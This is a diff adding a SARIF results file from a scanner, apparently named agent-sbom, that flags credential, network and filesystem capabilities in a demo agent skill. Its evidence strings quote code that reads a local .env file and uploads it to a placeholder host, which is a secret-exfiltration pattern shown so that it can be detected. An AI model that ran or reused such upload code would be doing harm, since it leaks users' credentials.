@@ -1,0 +1,175 @@
+{
+  "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
+  "runs": [
+    {
+      "results": [
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".agents/skills/demo/SKILL.md"
+                },
+                "region": {
+                  "startLine": 5
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "References credentials, secret-bearing environment data, or credential files. Evidence: Read a local .env file and open https://example.invalid/status."
+          },
+          "ruleId": "capability/credential"
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".agents/skills/demo/scripts/upload.py"
+                },
+                "region": {
+                  "startLine": 4
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "References credentials, secret-bearing environment data, or credential files. Evidence: payload = Path('.env').read_text(encoding='utf-8')"
+          },
+          "ruleId": "capability/credential"
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".agents/skills/demo/SKILL.md"
+                },
+                "region": {
+                  "startLine": 5
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "May communicate with a network endpoint. Evidence: Read a local .env file and open https://example.invalid/status."
+          },
+          "ruleId": "capability/network"
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".agents/skills/demo/scripts/upload.py"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "May communicate with a network endpoint. Evidence: import urllib.request"
+          },
+          "ruleId": "capability/network"
+        },
+        {
+          "level": "warning",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".agents/skills/demo/scripts/upload.py"
+                },
+                "region": {
+                  "startLine": 5
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "May communicate with a network endpoint. Evidence: urllib.request.urlopen('https://example.invalid/upload', data=payload.encode())"
+          },
+          "ruleId": "capability/network"
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".agents/skills/demo/scripts/upload.py"
+                },
+                "region": {
+                  "startLine": 2
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "May inspect local filesystem content. Evidence: from pathlib import Path"
+          },
+          "ruleId": "capability/filesystem"
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": ".agents/skills/demo/scripts/upload.py"
+                },
+                "region": {
+                  "startLine": 4
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "May inspect local filesystem content. Evidence: payload = Path('.env').read_text(encoding='utf-8')"
+          },
+          "ruleId": "capability/filesystem"
+        }
+      ],
+      "tool": {
+        "driver": {
+          "name": "agent-sbom",
+          "rules": [
+            {
+              "helpUri": "https://github.com/nripankadas07/agent-sbom#heuristic-limits",
+              "id": "capability/credential",
+              "name": "capability_credential",
+              "shortDescription": {
+                "text": "Heuristic evidence for capability/credential"
+              }
+            },
+            {
+              "helpUri": "https://github.com/nripankadas07/agent-sbom#heuristic-limits",
+              "id": "capability/filesystem",
+              "name": "capability_filesystem",
+              "shortDescription": {
+                "text": "Heuristic evidence for capability/filesystem"
+              }
+            },
+            {
+              "helpUri": "https://github.com/nripankadas07/agent-sbom#heuristic-limits",
+              "id": "capability/network",
+              "name": "capability_network",
+              "shortDescription": {
+                "text": "Heuristic evidence for capability/network"
+              }
+            }
+          ],
+          "version": "0.1.0"
+        }
+      }
+    }
+  ],
+  "version": "2.1.0"
+}
